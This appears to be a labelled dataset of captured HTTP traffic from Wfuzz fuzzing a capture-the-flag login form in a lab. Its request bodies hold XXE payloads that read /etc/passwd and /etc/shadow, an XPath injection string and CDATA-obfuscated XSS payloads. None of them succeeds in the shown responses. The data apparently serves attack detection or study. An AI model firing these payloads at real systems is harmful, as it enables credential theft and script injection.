@@ -1,0 +1,252 @@
+[
+  {
+    "attack_tag": "xml",
+    "src_ip": "192.168.60.157",
+    "dst_ip": "192.168.60.165",
+    "src_port": "51814",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.60.165/csccCTF/web/chall2/index.php",
+    "req_headers": {
+      "http.host": "192.168.60.165",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "145"
+    },
+    "req_body": "username=<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:////etc/passwd\">]><foo>&xxe;</foo>",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Tue, 07 Feb 2023 10:26:32 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "358",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=\"POST\" action=\"index.php\">   <input type=\"username\" name=\"username\" placeholder=\"username\">   <input type=\"password\" name=\"password\" placeholder=\"password\">   <input type=\"submit\" name=\"submit\" value=\"submit\">  </form> </body> </html> "
+  },
+  {
+    "attack_tag": "xml",
+    "src_ip": "192.168.60.157",
+    "dst_ip": "192.168.60.165",
+    "src_port": "51830",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.60.165/csccCTF/web/chall2/index.php",
+    "req_headers": {
+      "http.host": "192.168.60.165",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "144"
+    },
+    "req_body": "username=<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file://c:/boot.ini\">]><foo>&xxe;</foo>",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Tue, 07 Feb 2023 10:26:32 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "358",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=\"POST\" action=\"index.php\">   <input type=\"username\" name=\"username\" placeholder=\"username\">   <input type=\"password\" name=\"password\" placeholder=\"password\">   <input type=\"submit\" name=\"submit\" value=\"submit\">  </form> </body> </html> "
+  },
+  {
+    "attack_tag": "xml",
+    "src_ip": "192.168.60.157",
+    "dst_ip": "192.168.60.165",
+    "src_port": "51846",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.60.165/csccCTF/web/chall2/index.php",
+    "req_headers": {
+      "http.host": "192.168.60.165",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "42"
+    },
+    "req_body": "username=x' or name()='username' or 'x'='y",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Tue, 07 Feb 2023 10:26:32 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "358",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=\"POST\" action=\"index.php\">   <input type=\"username\" name=\"username\" placeholder=\"username\">   <input type=\"password\" name=\"password\" placeholder=\"password\">   <input type=\"submit\" name=\"submit\" value=\"submit\">  </form> </body> </html> "
+  },
+  {
+    "attack_tag": "xml",
+    "src_ip": "192.168.60.157",
+    "dst_ip": "192.168.60.165",
+    "src_port": "51850",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.60.165/csccCTF/web/chall2/index.php",
+    "req_headers": {
+      "http.host": "192.168.60.165",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "63"
+    },
+    "req_body": "username=<![CDATA[<script>var n=0;while(true){n++;}</script>]]>",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Tue, 07 Feb 2023 10:26:32 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "358",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=\"POST\" action=\"index.php\">   <input type=\"username\" name=\"username\" placeholder=\"username\">   <input type=\"password\" name=\"password\" placeholder=\"password\">   <input type=\"submit\" name=\"submit\" value=\"submit\">  </form> </body> </html> "
+  },
+  {
+    "attack_tag": "xml",
+    "src_ip": "192.168.60.157",
+    "dst_ip": "192.168.60.165",
+    "src_port": "51856",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.60.165/csccCTF/web/chall2/index.php",
+    "req_headers": {
+      "http.host": "192.168.60.165",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "87"
+    },
+    "req_body": "username=<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Tue, 07 Feb 2023 10:26:32 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "358",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=\"POST\" action=\"index.php\">   <input type=\"username\" name=\"username\" placeholder=\"username\">   <input type=\"password\" name=\"password\" placeholder=\"password\">   <input type=\"submit\" name=\"submit\" value=\"submit\">  </form> </body> </html> "
+  },
+  {
+    "attack_tag": "xml",
+    "src_ip": "192.168.60.157",
+    "dst_ip": "192.168.60.165",
+    "src_port": "51866",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.60.165/csccCTF/web/chall2/index.php",
+    "req_headers": {
+      "http.host": "192.168.60.165",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "141"
+    },
+    "req_body": "username=<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Tue, 07 Feb 2023 10:26:32 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "358",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=\"POST\" action=\"index.php\">   <input type=\"username\" name=\"username\" placeholder=\"username\">   <input type=\"password\" name=\"password\" placeholder=\"password\">   <input type=\"submit\" name=\"submit\" value=\"submit\">  </form> </body> </html> "
+  },
+  {
+    "attack_tag": "xml",
+    "src_ip": "192.168.60.157",
+    "dst_ip": "192.168.60.165",
+    "src_port": "51868",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.60.165/csccCTF/web/chall2/index.php",
+    "req_headers": {
+      "http.host": "192.168.60.165",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "85"
+    },
+    "req_body": "username=<xml ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]>",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Tue, 07 Feb 2023 10:26:32 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "358",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=\"POST\" action=\"index.php\">   <input type=\"username\" name=\"username\" placeholder=\"username\">   <input type=\"password\" name=\"password\" placeholder=\"password\">   <input type=\"submit\" name=\"submit\" value=\"submit\">  </form> </body> </html> "
+  },
+  {
+    "attack_tag": "xml",
+    "src_ip": "192.168.60.157",
+    "dst_ip": "192.168.60.165",
+    "src_port": "51874",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.60.165/csccCTF/web/chall2/index.php",
+    "req_headers": {
+      "http.host": "192.168.60.165",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "218"
+    },
+    "req_body": "username=<xml ID=\"xss\"><I><B>&lt;IMG SRC=\"javas<!-- -->cript:alert('XSS')\"&gt;</B></I></xml><SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Tue, 07 Feb 2023 10:26:32 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "358",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=\"POST\" action=\"index.php\">   <input type=\"username\" name=\"username\" placeholder=\"username\">   <input type=\"password\" name=\"password\" placeholder=\"password\">   <input type=\"submit\" name=\"submit\" value=\"submit\">  </form> </body> </html> "
+  },
+  {
+    "attack_tag": "xml",
+    "src_ip": "192.168.60.157",
+    "dst_ip": "192.168.60.165",
+    "src_port": "51878",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.60.165/csccCTF/web/chall2/index.php",
+    "req_headers": {
+      "http.host": "192.168.60.165",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "145"
+    },
+    "req_body": "username=<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:////dev/random\">]><foo>&xxe;</foo>",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Tue, 07 Feb 2023 10:26:32 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "358",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=\"POST\" action=\"index.php\">   <input type=\"username\" name=\"username\" placeholder=\"username\">   <input type=\"password\" name=\"password\" placeholder=\"password\">   <input type=\"submit\" name=\"submit\" value=\"submit\">  </form> </body> </html> "
+  },
+  {
+    "attack_tag": "xml",
+    "src_ip": "192.168.60.157",
+    "dst_ip": "192.168.60.165",
+    "src_port": "51884",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.60.165/csccCTF/web/chall2/index.php",
+    "req_headers": {
+      "http.host": "192.168.60.165",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "145"
+    },
+    "req_body": "username=<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:////etc/shadow\">]><foo>&xxe;</foo>",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Tue, 07 Feb 2023 10:26:32 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "358",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=\"POST\" action=\"index.php\">   <input type=\"username\" name=\"username\" placeholder=\"username\">   <input type=\"password\" name=\"password\" placeholder=\"password\">   <input type=\"submit\" name=\"submit\" value=\"submit\">  </form> </body> </html> "
+  }
+]
